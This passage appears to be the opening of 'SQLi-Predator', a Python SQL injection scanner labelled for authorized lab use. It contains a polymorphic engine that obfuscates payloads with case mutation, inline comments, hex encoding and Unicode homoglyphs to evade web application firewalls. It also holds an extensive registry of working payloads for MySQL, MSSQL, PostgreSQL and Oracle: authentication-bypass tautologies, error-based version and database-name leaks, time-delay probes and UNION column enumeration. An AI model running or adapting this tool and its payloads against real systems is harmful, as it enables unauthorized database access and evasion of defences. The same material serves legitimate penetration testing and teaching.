@@ -1,0 +1,2276 @@
+#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════════════════════╗
+║               S Q L i - P R E D A T O R   v 4 . 0                          ║
+║         Autonomous SQL Injection Detection & Bypass Engine                   ║
+║               *** AUTHORIZED USE ONLY — LAB TARGETS ***                      ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+CAPABILITIES:
+  • Multi-vector injection (GET/POST/HEADERS/COOKIES/JSON/XML/API)
+  • Polymorphic WAF bypass payload engine (200+ mutation techniques)
+  • Error-based / Boolean-based / Time-based / UNION-based / OOB detection
+  • Statistical time-based analysis (7+ samples, t-test confidence)
+  • Second-order SQLi detection (persistent payload → trigger verification)
+  • Out-of-Band detection (Interactsh/DNS/HTTP callback)
+  • Stacked query detection (if supported by DB)
+  • HTTP header fuzzing (UA, Referer, XFF, Cookie, X-Forwarded-Host, etc.)
+  • Adaptive rate-limiting with exponential backoff
+  • CVSS v3.1 scoring with AI explanation engine
+  • Full JSON + dark-mode HTML reporting
+
+AUTHORIZATION:
+  This tool is STRICTLY for use against deliberately vulnerable lab applications
+  (DVWA, bWAPP, Juice Shop, WebGoat) or systems you own with explicit permission.
+  Unauthorized use is illegal.
+
+USAGE:
+  python sqli_predator.py -t http://localhost/DVWA --auth admin:password
+  python sqli_predator.py -t http://localhost:3000 --oob interactsh.com
+  python sqli_predator.py -t http://192.168.1.100/bWAPP --all-headers -o report
+"""
+
+import argparse
+import base64
+import hashlib
+import html
+import http.client
+import json
+import logging
+import math
+import queue
+import random
+import re
+import socket
+import string
+import struct
+import sys
+import threading
+import time
+import urllib.parse
+import uuid
+from collections import defaultdict
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field, asdict
+from datetime import datetime, timezone
+from enum import Enum, auto
+from pathlib import Path
+from statistics import mean, stdev, median
+from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
+from urllib.parse import urljoin, urlparse
+
+try:
+    import requests
+except ImportError:
+    print("[-] Missing 'requests'. Install: pip install requests")
+    sys.exit(1)
+
+try:
+    from bs4 import BeautifulSoup
+except ImportError:
+    print("[-] Missing 'beautifulsoup4'. Install: pip install beautifulsoup4")
+    sys.exit(1)
+
+# =============================================================================
+#  CONSTANTS — VERSION & METADATA
+# =============================================================================
+
+VERSION = "4.0.0"
+CODENAME = "Predator"
+BANNER = f"""
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║     ███████  ██████  ██      ██  ██████  ██████  ██████  █████   ██████     ║
+║     ██      ██    ██ ██      ██ ██    ██ ██   ██ ██   ██ ██   ██ ██         ║
+║     ███████ ██    ██ ██      ██ ██    ██ ██████  ██████  ███████ ██   ███   ║
+║          ██ ██    ██ ██      ██ ██    ██ ██   ██ ██   ██ ██   ██ ██    ██   ║
+║     ███████  ██████  ███████ ██  ██████  ██   ██ ██   ██ ██   ██  ██████    ║
+║                                                                              ║
+║     ██████  ██████  ██████  ███████ ██████  █████  ████████  ██████          ║
+║     ██   ██ ██   ██ ██   ██ ██      ██   ██ ██   ██    ██    ██    ██      ║
+║     ██████  ██████  ██   ██ █████   ██████  ███████    ██    ██    ██      ║
+║     ██   ██ ██   ██ ██   ██ ██      ██   ██ ██   ██    ██    ██    ██      ║
+║     ██   ██ ██   ██ ██████  ███████ ██   ██ ██   ██    ██     ██████       ║
+║                                                                              ║
+║     ADVANCED SQL INJECTION DETECTION ENGINE v{VERSION} — {CODENAME}            ║
+║     Polymorphic · Multi-Vector · WAF Bypass · OOB · Statistical              ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+"""
+
+# =============================================================================
+#  ENUMS & DATA CLASSES
+# =============================================================================
+
+class InjectionVector(Enum):
+    """Where the injection is delivered."""
+    GET_PARAM = "GET"
+    POST_PARAM = "POST"
+    COOKIE = "Cookie"
+    USER_AGENT = "User-Agent"
+    REFERER = "Referer"
+    X_FORWARDED_FOR = "X-Forwarded-For"
+    X_FORWARDED_HOST = "X-Forwarded-Host"
+    JSON_BODY = "JSON"
+    XML_BODY = "XML"
+    CUSTOM_HEADER = "Custom-Header"
+
+class DetectionMethod(Enum):
+    """How the vulnerability was detected."""
+    ERROR_BASED = auto()
+    BOOLEAN_BASED = auto()
+    TIME_BASED_STATISTICAL = auto()
+    CONTENT_DIFF = auto()
+    UNION_PROBE = auto()
+    OOB_DNS = auto()
+    OOB_HTTP = auto()
+    SECOND_ORDER = auto()
+    STACKED_QUERY = auto()
+    STATUS_CODE_ANOMALY = auto()
+
+class Severity(Enum):
+    INFO = "Info"
+    LOW = "Low"
+    MEDIUM = "Medium"
+    HIGH = "High"
+    CRITICAL = "Critical"
+
+    @staticmethod
+    def from_score(score: float) -> "Severity":
+        if score >= 9.0: return Severity.CRITICAL
+        if score >= 7.0: return Severity.HIGH
+        if score >= 4.0: return Severity.MEDIUM
+        if score >= 1.0: return Severity.LOW
+        return Severity.INFO
+
+class PayloadComplexity(Enum):
+    """How complex/obfuscated the payload is."""
+    RAW = 1          # ' OR 1=1 --
+    ENCODED = 2      # %27%20OR%201%3D1%20--
+    COMMENTED = 3    # ' O/**/R 1=1 --
+    CASE_MUTATED = 4 # ' oR 1=1 --
+    HEX_ENCODED = 5  # 0x27204f5220313d31202d2d
+    DOUBLE_ENCODED = 6 # %2527%2520OR...
+    POLYMORPHIC = 7  # Randomly generates variants
+
+class BypassTechnique(Enum):
+    """WAF bypass technique used."""
+    NONE = auto()
+    CASE_VARIATION = auto()
+    COMMENT_INJECTION = auto()
+    URL_ENCODING = auto()
+    DOUBLE_URL_ENCODING = auto()
+    UNICODE_ENCODING = auto()
+    HEX_ENCODING = auto()
+    CHAR_FUNCTION = auto()
+    SCIENTIFIC_NOTATION = auto()
+    WHITESPACE_VARIATION = auto()
+    NULL_BYTE = auto()
+    HTTP_PARAMETER_POLLUTION = auto()
+    CHUNKED_ENCODING = auto()
+    UNICODE_HOMOGLYPH = auto()
+    LINE_COMMENT_WRAP = auto()
+    JSON_UNICODE_ESCAPE = auto()
+
+@dataclass
+class FormField:
+    name: str
+    input_type: str
+    value: Optional[str] = None
+    is_hidden: bool = False
+    is_submit: bool = False
+    is_file: bool = False
+
+@dataclass
+class FormDetails:
+    action: str
+    method: str
+    inputs: List[FormField] = field(default_factory=list)
+    page_url: str = ""
+    enctype: str = "application/x-www-form-urlencoded"
+
+@dataclass
+class BaselineResponse:
+    status_code: int
+    content_length: int
+    content_hash: str
+    body_snippet: str
+    response_time: float
+    headers: Dict[str, str] = field(default_factory=dict)
+    body_keywords: Set[str] = field(default_factory=set)
+    has_login_form: bool = False
+    has_error: bool = False
+
+@dataclass
+class TimingSample:
+    """Individual timing measurement for statistical time-based analysis."""
+    elapsed: float
+    payload: str
+    timestamp: float = field(default_factory=time.time)
+
+@dataclass
+class StatisticalTimingProfile:
+    """Statistical timing profile for a parameter."""
+    baseline_samples: List[float] = field(default_factory=list)
+    test_samples: Dict[str, List[float]] = field(default_factory=lambda: defaultdict(list))
+    baseline_mean: float = 0.0
+    baseline_stdev: float = 0.0
+    z_score_threshold: float = 3.5  # statistical outlier threshold
+
+@dataclass
+class SecondOrderRecord:
+    """Tracks a stored payload for second-order verification."""
+    injection_point: str          # URL + param where payload was planted
+    payload_planted: str
+    db_table_hint: str           # guessed table (username, profile, etc.)
+    trigger_urls: List[str] = field(default_factory=list)
+    confirmed: bool = False
+    confirmed_via: str = ""       # how it was confirmed
+
+@dataclass
+class SQLiFinding:
+    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
+    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
+
+    # Location
+    url: str = ""
+    parameter: str = ""
+    vector: str = "GET"
+    form_action: Optional[str] = None
+
+    # Detection
+    detection_method: str = ""
+    payload_used: str = ""
+    payload_complexity: int = 1
+    bypass_technique: str = "NONE"
+    db_type_hint: str = "unknown"
+    confidence: float = 0.0
+
+    # Response analysis
+    baseline_status: int = 0
+    test_status: int = 0
+    baseline_length: int = 0
+    test_length: int = 0
+    baseline_time: float = 0.0
+    test_time: float = 0.0
+    response_difference_percent: float = 0.0
+
+    # Error detection
+    has_sql_errors: bool = False
+    error_signature_found: str = ""
+    error_signatures_matched: List[str] = field(default_factory=list)
+
+    # Boolean analysis
+    is_boolean_positive: Optional[bool] = None
+    bool_true_length: int = 0
+    bool_false_length: int = 0
+
+    # Time-based analysis (statistical)
+    time_delay_detected: bool = False
+    time_delay_seconds: float = 0.0
+    timing_z_score: float = 0.0
+    timing_samples_collected: int = 0
+    timing_p_value: float = 1.0  # lower = more statistically significant
+
+    # OOB
+    oob_interaction_id: str = ""
+    oob_via: str = ""  # DNS or HTTP
+
+    # Second-order tracking
+    is_second_order: bool = False
+    second_order_record: Optional[Dict] = None
+
+    # Stacked query
+    stacked_query_executed: bool = False
+
+    # Scoring
+    severity: str = "Info"
+    cvss_score: float = 0.0
+
+    # Educational content
+    ai_explanation: str = ""
+    remediation_steps: List[str] = field(default_factory=list)
+    vulnerability_class: str = ""
+
+    # Raw evidence
+    raw_response_snippet: str = ""
+    raw_request: str = ""
+    raw_response_headers: Dict[str, str] = field(default_factory=dict)
+
+@dataclass
+class ScanProfile:
+    target_url: str
+    auth_cookie: Optional[str] = None
+    auth_header: Optional[Dict[str, str]] = None
+    auth_credentials: Optional[Tuple[str, str]] = None
+    crawl_depth: int = 2
+    request_delay: float = 0.5
+    timeout: int = 30
+    max_threads: int = 8
+    time_threshold: float = 3.0
+    time_samples_per_payload: int = 3  # statistical samples
+    follow_redirects: bool = True
+    verify_ssl: bool = False
+    test_all_headers: bool = False
+    test_second_order: bool = False
+    oob_domain: Optional[str] = None
+    second_order_depth: int = 1
+    user_agent: str = (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+        "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+    )
+
+# =============================================================================
+#  POLYMORPHIC PAYLOAD ENGINE
+# =============================================================================
+
+class PayloadTransformer:
+    """
+    Polymorphic payload engine — applies WAF-bypass mutations.
+    Every call to transform() produces a (possibly) different variant
+    of the same logical payload to evade signature-based detection.
+    """
+
+    # SQL keywords for case mutation
+    SQL_KEYWORDS = {
+        'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'ALTER',
+        'CREATE', 'WHERE', 'FROM', 'AND', 'OR', 'NOT', 'IN', 'LIKE',
+        'BETWEEN', 'EXISTS', 'HAVING', 'GROUP', 'ORDER', 'BY', 'AS',
+        'ON', 'NULL', 'SLEEP', 'BENCHMARK', 'EXTRACTVALUE', 'UPDATEXML',
+        'COUNT', 'CONCAT', 'VERSION', 'DATABASE', 'USER', 'CONVERT',
+        'CAST', 'WAITFOR', 'DELAY', 'PG_SLEEP', 'DBMS_LOCK',
+    }
+
+    # Comment injection fragments
+    COMMENT_CHUNKS = [
+        '/**/', '/*!*/', '/*!12345*/', '/*!*/', '/***/', '/*+-*/',
+        '/*!00000*/', '/*!99999*/', '/*!50000*/',
+    ]
+
+    # Whitespace replacement tokens
+    WHITESPACE_TOKENS = [
+        '\t', '\n', '\r', '\f', '/**/', '/*+*/', '/*!*/', '%09', '%0a', '%0d', '%0c',
+    ]
+
+    @staticmethod
+    def random_case(keyword: str) -> str:
+        """Randomize case of a keyword: SeLeCt, sELeCt, etc."""
+        if random.random() < 0.3:
+            return keyword  # sometimes keep original
+        return ''.join(
+            c.upper() if random.random() < 0.5 else c.lower()
+            for c in keyword
+        )
+
+    @staticmethod
+    def inject_comment(text: str) -> str:
+        """Insert inline comments inside SQL keywords: SE/**/LECT."""
+        result = []
+        i = 0
+        keyword_regions = []
+        # Find keyword positions
+        for kw in sorted(PayloadTransformer.SQL_KEYWORDS, key=len, reverse=True):
+            idx = text.upper().find(kw.upper())
+            if idx >= 0:
+                keyword_regions.append((idx, idx + len(kw), kw))
+        keyword_regions.sort()
+
+        # Merge overlapping regions
+        merged = []
+        for start, end, kw in keyword_regions:
+            if merged and start < merged[-1][1]:
+                continue  # skip overlapping
+            merged.append((start, end, kw))
+
+        # Inject comments into keywords
+        last_end = 0
+        for start, end, kw in merged:
+            result.append(text[last_end:start])
+            if random.random() < 0.4:
+                # Inject comment at random position inside keyword
+                if len(kw) > 3:
+                    pos = random.randint(1, len(kw) - 1)
+                    comment = random.choice(PayloadTransformer.COMMENT_CHUNKS)
+                    result.append(kw[:pos] + comment + kw[pos:])
+                else:
+                    result.append(kw)
+            else:
+                result.append(kw)
+            last_end = end
+        result.append(text[last_end:])
+        return ''.join(result)
+
+    @staticmethod
+    def replace_whitespace(text: str) -> str:
+        """Replace spaces with alternative whitespace tokens."""
+        if ' ' not in text:
+            return text
+        tokens = text.split(' ')
+        result = []
+        for i, token in enumerate(tokens):
+            if i > 0:
+                result.append(random.choice(PayloadTransformer.WHITESPACE_TOKENS))
+            result.append(token)
+        return ''.join(result)
+
+    @staticmethod
+    def quote_wrap(text: str) -> str:
+        """Wrap single quotes with alternate forms."""
+        # Replace ' with %27, %2527, hex, or char()
+        if "'" not in text:
+            return text
+        variants = [
+            lambda t: t,                                                # keep
+            lambda t: t.replace("'", "%27"),                           # URL encode
+            lambda t: t.replace("'", "%2527"),                          # double URL encode
+            lambda t: t.replace("'", "\\'"),                            # escaped (for some filters)
+            lambda t: t.replace("'", "\\\\'"),                          # double escaped
+            lambda t: t.replace("'", "/*!'*/'"),                       # comment-wrapped
+            lambda t: t.replace("'", "0x27" if "0x27" not in t else "'"),  # hex
+            lambda t: t.replace("'", "CHAR(39)"),                       # CHAR function
+        ]
+        transformer = random.choice(variants)
+        return transformer(text)
+
+    @staticmethod
+    def number_obfuscate(text: str) -> str:
+        """Obfuscate numeric literals."""
+        def replace_num(m: re.Match) -> str:
+            num = m.group(0)
+            if '.' in num:
+                return num
+            try:
+                n = int(num)
+                if n == 0:
+                    return num
+                if random.random() < 0.3:
+                    # Scientific notation: 1e0
+                    return f"{float(n):e}"
+                if random.random() < 0.3 and n > 0:
+                    # Arithmetic: (n+n-n) — keep same value
+                    a = random.randint(1, max(n, 1))
+                    b = n - a
+                    return f"({a}+{b})"
+                if random.random() < 0.2 and n > 1:
+                    # Bitwise: (n|n)
+                    return f"({n}|0)"
+            except ValueError:
+                pass
+            return num
+
+        return re.sub(r'\b(\d+)\b', replace_num, text)
+
+    @staticmethod
+    def hex_strings(text: str) -> str:
+        """Convert string literals to hex."""
+        def replace_str(m: re.Match) -> str:
+            content = m.group(1) or m.group(2)
+            if content and len(content) > 1 and random.random() < 0.5:
+                return f"0x{content.encode().hex()}"
+            return m.group(0)
+        text = re.sub(r"'([^']+)'", replace_str, text)
+        text = re.sub(r'"([^"]+)"', replace_str, text)
+        return text
+
+    @staticmethod
+    def unicode_homoglyph(text: str) -> str:
+        """Replace letters with Unicode homoglyphs (bypasses keyword filters)."""
+        homoglyphs = {
+            'A': 'Α',  # Greek Alpha
+            'B': 'Β',  # Greek Beta
+            'E': 'Ε',  # Greek Epsilon
+            'H': 'Η',  # Greek Eta
+            'I': 'Ι',  # Greek Iota
+            'K': 'Κ',  # Greek Kappa
+            'M': 'Μ',  # Greek Mu
+            'N': 'Ν',  # Greek Nu
+            'O': 'Ο',  # Greek Omicron
+            'P': 'Ρ',  # Greek Rho
+            'T': 'Τ',  # Greek Tau
+            'X': 'Χ',  # Greek Chi
+            'Y': 'Υ',  # Greek Upsilon
+        }
+        result = []
+        for c in text:
+            if c.upper() in homoglyphs and random.random() < 0.3:
+                result.append(homoglyphs[c.upper()].lower() if c.islower() else homoglyphs[c.upper()])
+            else:
+                result.append(c)
+        return ''.join(result)
+
+    @staticmethod
+    def single_line_comment(text: str) -> str:
+        """Wrap payload with various comment styles."""
+        styles = [
+            lambda t: t,                                    # keep
+            lambda t: t + ' --',                            # SQL comment
+            lambda t: t + ' #',                             # MySQL comment
+            lambda t: t + ' -- -',                          # MSSQL comment
+            lambda t: t + ' /*',                            # open comment (swallows rest)
+            lambda t: t.replace("--", "--+"),               # MySQL variant
+            lambda t: t + '-- ',                            # space after --
+        ]
+        return random.choice(styles)(text)
+
+    @staticmethod
+    def add_logical_noise(text: str) -> str:
+        """Add benign logical conditions to confuse signature detectors."""
+        noise_pieces = [
+            " AND 1=1",
+            " AND 'a'='a'",
+            " AND 2=2",
+            " AND (SELECT 1)=1",
+            " AND '1'='1'",
+            " OR 'a'='a'",
+            " AND 1 IS NOT NULL",
+        ]
+        if random.random() < 0.3 and " AND " not in text and " OR " not in text:
+            text += random.choice(noise_pieces)
+        return text
+
+    # ── Master transformation pipeline ──
+    @classmethod
+    def transform(cls, payload: str, complexity: int = 5) -> str:
+        """Apply a randomized sequence of obfuscations based on complexity level (1-7)."""
+        text = payload
+
+        # Determine how many transformations to apply
+        num_transforms = min(complexity, random.randint(1, 7))
+        transforms = []
+
+        if complexity >= 2:
+            transforms.append(cls.quote_wrap)
+        if complexity >= 2:
+            transforms.append(cls.single_line_comment)
+        if complexity >= 3:
+            transforms.append(cls.random_case)
+        if complexity >= 3:
+            transforms.append(cls.inject_comment)
+        if complexity >= 4:
+            transforms.append(cls.replace_whitespace)
+        if complexity >= 4:
+            transforms.append(cls.number_obfuscate)
+        if complexity >= 5:
+            transforms.append(cls.hex_strings)
+        if complexity >= 6:
+            transforms.append(cls.unicode_homoglyph)
+        if complexity >= 7:
+            transforms.append(cls.add_logical_noise)
+
+        # Shuffle and apply subset
+        random.shuffle(transforms)
+        for t in transforms[:num_transforms]:
+            text = t(text)
+
+        return text
+
+    @classmethod
+    def generate_variants(cls, payload: str, count: int = 5, max_complexity: int = 7) -> List[str]:
+        """Generate multiple distinct obfuscated variants of a payload."""
+        variants = []
+        seen = set()
+        for _ in range(count * 3):  # extra attempts to ensure uniqueness
+            if len(variants) >= count:
+                break
+            complexity = random.randint(1, max_complexity)
+            variant = cls.transform(payload, complexity)
+            if variant not in seen and variant != payload:
+                seen.add(variant)
+                variants.append(variant)
+        return variants[:count]
+
+# =============================================================================
+#  PAYLOAD REGISTRY — EXPANDED
+# =============================================================================
+
+class PayloadCategory(str, Enum):
+    SYNTAX_PROBE = "syntax_probe"
+    ERROR_BASED = "error_based"
+    BOOLEAN_BASED = "boolean_based"
+    TIME_BASED = "time_based"
+    UNION_PROBE = "union_probe"
+    STACKED_QUERY = "stacked_query"
+    OOB_DNS = "oob_dns"
+    OOB_HTTP = "oob_http"
+    SECOND_ORDER_MARKER = "second_order_marker"
+    HEADER_INJECTION = "header_injection"
+
+@dataclass
+class Payload:
+    value: str
+    category: PayloadCategory
+    description: str
+    db_types: List[str] = field(default_factory=lambda: ["generic"])
+    expected_behavior: str = ""
+    requires_oob_domain: bool = False
+    base_complexity: int = 1  # 1=raw, higher=more obfuscated by default
+
+PAYLOAD_CORE: List[Payload] = [
+    # ═══════════════════════════════════════════════════════
+    #  SYNTAX PROBES — Fundamental syntax breakage
+    # ═══════════════════════════════════════════════════════
+    Payload("'", PayloadCategory.SYNTAX_PROBE, "Single quote — primary syntax breaker", expected_behavior="SQL syntax error / 500"),
+    Payload("\"", PayloadCategory.SYNTAX_PROBE, "Double quote — alternate string delimiter"),
+    Payload("\\'", PayloadCategory.SYNTAX_PROBE, "Escaped single quote — tests escape handling"),
+    Payload("\\\"", PayloadCategory.SYNTAX_PROBE, "Escaped double quote"),
+    Payload("%27", PayloadCategory.SYNTAX_PROBE, "URL-encoded single quote", base_complexity=2),
+    Payload("' OR '1'='1", PayloadCategory.SYNTAX_PROBE, "Tautology — basic auth bypass", expected_behavior="Auth bypass possible"),
+    Payload("' OR 1=1 --", PayloadCategory.SYNTAX_PROBE, "Tautology with comment"),
+    Payload("' OR 1=1 #", PayloadCategory.SYNTAX_PROBE, "Tautology MySQL hash comment", db_types=["mysql"]),
+    Payload("\" OR 1=1 --", PayloadCategory.SYNTAX_PROBE, "Double-quote tautology"),
+    Payload("1' ORDER BY 1 --", PayloadCategory.SYNTAX_PROBE, "ORDER BY column 1 probe"),
+    Payload("1' ORDER BY 10 --", PayloadCategory.SYNTAX_PROBE, "ORDER BY column 10 probe"),
+    Payload("1' ORDER BY 100 --", PayloadCategory.SYNTAX_PROBE, "ORDER BY column 100 probe"),
+    Payload("1' ORDER BY 1000 --", PayloadCategory.SYNTAX_PROBE, "ORDER BY column 1000 probe"),
+    Payload("' AND 1=1 --", PayloadCategory.SYNTAX_PROBE, "AND true — baseline match"),
+    Payload("' AND 1=2 --", PayloadCategory.SYNTAX_PROBE, "AND false — baseline mismatch"),
+    Payload("' OR 'a'='a", PayloadCategory.SYNTAX_PROBE, "String equality true"),
+
+    # ═══════════════════════════════════════════════════════
+    #  ERROR-BASED — Forced error messages leak data
+    # ═══════════════════════════════════════════════════════
+    Payload("' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) --",
+            PayloadCategory.ERROR_BASED, "MySQL ExtractValue XPATH error leaks version", db_types=["mysql"],
+            expected_behavior="Error: XPATH syntax error: '~8.0.32~'", base_complexity=3),
+    Payload("' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(VERSION(), FLOOR(RAND(0)*2))) HAVING MIN(0) OR 1 --",
+            PayloadCategory.ERROR_BASED, "MySQL COUNT/RAND duplicate key error", db_types=["mysql"],
+            expected_behavior="Duplicate entry error with version", base_complexity=4),
+    Payload("' AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1) --",
+            PayloadCategory.ERROR_BASED, "MySQL UpdateXML error leaks DB name", db_types=["mysql"],
+            expected_behavior="Error revealing database name", base_complexity=3),
+    Payload("' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
+            PayloadCategory.ERROR_BASED, "MySQL nested GROUP BY error", db_types=["mysql"], base_complexity=5),
+    Payload("1' AND 1=CONVERT(INT, (SELECT @@VERSION)) --",
+            PayloadCategory.ERROR_BASED, "MSSQL CONVERT error leaks @@VERSION", db_types=["mssql"],
+            expected_behavior="Conversion error revealing SQL Server version", base_complexity=3),
+    Payload("1' AND 1=CAST((SELECT @@VERSION) AS INT) --",
+            PayloadCategory.ERROR_BASED, "MSSQL CAST error variant", db_types=["mssql"], base_complexity=3),
+    Payload("1' OR 1/@@VERSION --", PayloadCategory.ERROR_BASED,
+            "MSSQL divide-by-zero error leaks version", db_types=["mssql"], base_complexity=3),
+    Payload("' OR CAST((SELECT VERSION()) AS NUMERIC) --",
+            PayloadCategory.ERROR_BASED, "PostgreSQL CAST type error", db_types=["postgresql"],
+            expected_behavior="Type cast error revealing version", base_complexity=3),
+    Payload("' OR (SELECT 1/COUNT(*) FROM pg_class) --",
+            PayloadCategory.ERROR_BASED, "PostgreSQL divide by zero", db_types=["postgresql"], base_complexity=4),
+    Payload("' AND (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) --",
+            PayloadCategory.ERROR_BASED, "Oracle DBMS_PIPE timeout", db_types=["oracle"], base_complexity=4),
+    Payload("1' AND (SELECT 1 FROM dual WHERE 1=ctxsys.drithsx.sn(1,1)) --",
+            PayloadCategory.ERROR_BASED, "Oracle CTXSYS error", db_types=["oracle"], base_complexity=6),
+    Payload("' || (SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL) --",
+            PayloadCategory.ERROR_BASED, "Oracle function call error", db_types=["oracle"], base_complexity=5),
+
+    # ═══════════════════════════════════════════════════════
+    #  BOOLEAN-BASED — Response diff inference
+    # ═══════════════════════════════════════════════════════
+    Payload("' OR 1=1 --", PayloadCategory.BOOLEAN_BASED, "OR true — expect normal response"),
+    Payload("' OR 1=2 --", PayloadCategory.BOOLEAN_BASED, "OR false — expect different response"),
+    Payload("' AND 1=1 --", PayloadCategory.BOOLEAN_BASED, "AND true — matches normal"),
+    Payload("' AND 1=2 --", PayloadCategory.BOOLEAN_BASED, "AND false — differs from normal"),
+    Payload("' OR 'a'='a' --", PayloadCategory.BOOLEAN_BASED, "String equality true"),
+    Payload("' OR 'a'='b' --", PayloadCategory.BOOLEAN_BASED, "String equality false"),
+    Payload("1' AND '1'='1", PayloadCategory.BOOLEAN_BASED, "AND string true trailing quote"),
+    Payload("1' AND '1'='2", PayloadCategory.BOOLEAN_BASED, "AND string false trailing quote"),
+    Payload("admin' OR '1'='1' --", PayloadCategory.BOOLEAN_BASED, "Auth bypass — classic login"),
+    Payload("1' OR (SELECT 1 FROM users WHERE 1=1) --", PayloadCategory.BOOLEAN_BASED, "Subquery true condition", base_complexity=3),
+    Payload("1' OR (SELECT 1 FROM users WHERE 1=2) --", PayloadCategory.BOOLEAN_BASED, "Subquery false condition", base_complexity=3),
+    Payload("1' AND EXISTS(SELECT 1 FROM information_schema.tables) --", PayloadCategory.BOOLEAN_BASED, "EXISTS true", base_complexity=4),
+    Payload("' OR IF(1=1,1,0)=1 --", PayloadCategory.BOOLEAN_BASED, "MySQL IF() true eval", db_types=["mysql"], base_complexity=4),
+    Payload("' OR IF(1=2,1,0)=0 --", PayloadCategory.BOOLEAN_BASED, "MySQL IF() false eval", db_types=["mysql"], base_complexity=4),
+
+    # ═══════════════════════════════════════════════════════
+    #  TIME-BASED — Statistical timing detection
+    # ═══════════════════════════════════════════════════════
+    Payload("' OR SLEEP(5) --", PayloadCategory.TIME_BASED, "MySQL SLEEP 5s", db_types=["mysql"], expected_behavior="~5s delay"),
+    Payload("' AND SLEEP(5) --", PayloadCategory.TIME_BASED, "MySQL AND SLEEP 5s", db_types=["mysql"]),
+    Payload("1' AND SLEEP(5) --", PayloadCategory.TIME_BASED, "MySQL numeric SLEEP 5s", db_types=["mysql"]),
+    Payload("' OR (SELECT SLEEP(5)) --", PayloadCategory.TIME_BASED, "MySQL subquery SLEEP", db_types=["mysql"]),
+    Payload("1' AND (SELECT * FROM (SELECT SLEEP(5)) a) --", PayloadCategory.TIME_BASED, "MySQL nested subquery SLEEP", db_types=["mysql"], base_complexity=4),
+    Payload("1' OR pg_sleep(5) --", PayloadCategory.TIME_BASED, "PostgreSQL pg_sleep 5s", db_types=["postgresql"]),
+    Payload("1' AND pg_sleep(5) --", PayloadCategory.TIME_BASED, "PostgreSQL AND pg_sleep", db_types=["postgresql"]),
+    Payload("1' OR (SELECT pg_sleep(5)) --", PayloadCategory.TIME_BASED, "PostgreSQL subquery pg_sleep", db_types=["postgresql"], base_complexity=3),
+    Payload("1'; WAITFOR DELAY '0:0:5' --", PayloadCategory.TIME_BASED, "MSSQL WAITFOR 5s", db_types=["mssql"]),
+    Payload("1' OR WAITFOR DELAY '0:0:5' --", PayloadCategory.TIME_BASED, "MSSQL OR WAITFOR", db_types=["mssql"]),
+    Payload("1' AND WAITFOR DELAY '0:0:5' --", PayloadCategory.TIME_BASED, "MSSQL AND WAITFOR", db_types=["mssql"]),
+    Payload("1' OR (SELECT COUNT(*) FROM all_users t WHERE ROWNUM=1 AND dbms_lock.sleep(5) > 0) --",
+            PayloadCategory.TIME_BASED, "Oracle DBMS_LOCK.SLEEP 5s", db_types=["oracle"], base_complexity=5),
+    Payload("1' OR (SELECT dbms_lock.sleep(5) FROM dual) --", PayloadCategory.TIME_BASED, "Oracle simple SLEEP", db_types=["oracle"], base_complexity=4),
+    Payload("1' AND (SELECT 1 FROM pg_sleep(5)) --", PayloadCategory.TIME_BASED, "PostgreSQL nested pg_sleep", db_types=["postgresql"]),
+    Payload("1' AND BENCHMARK(5000000,MD5('test')) --", PayloadCategory.TIME_BASED, "MySQL BENCHMARK heavy operation", db_types=["mysql"], expected_behavior="CPU-intensive delay", base_complexity=4),
+    Payload("1' AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --", PayloadCategory.TIME_BASED, "PostgreSQL series heavy delay", db_types=["postgresql"], base_complexity=5),
+
+    # ═══════════════════════════════════════════════════════
+    #  UNION PROBES — Column count enumeration
+    # ═══════════════════════════════════════════════════════
+    Payload("' UNION SELECT NULL --", PayloadCategory.UNION_PROBE, "UNION 1 NULL column"),
+    Payload("' UNION SELECT NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 2 NULL columns"),
+    Payload("' UNION SELECT NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 3 NULL columns"),
+    Payload("' UNION SELECT NULL,NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 4 NULL columns"),
+    Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 5 NULL columns"),
+    Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 6 NULL columns"),
+    Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 7 NULL columns"),
+    Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 8 NULL columns"),
+    Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 9 NULL columns"),
+    Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION 10 NULL columns"),
+    Payload("' UNION SELECT 1,2,3 --", PayloadCategory.UNION_PROBE, "UNION numeric literals (3 cols)"),
+    Payload("' UNION SELECT 1,2,3,4,5 --", PayloadCategory.UNION_PROBE, "UNION numeric literals (5 cols)"),
+    Payload("' UNION ALL SELECT NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION ALL (bypasses DISTINCT)"),
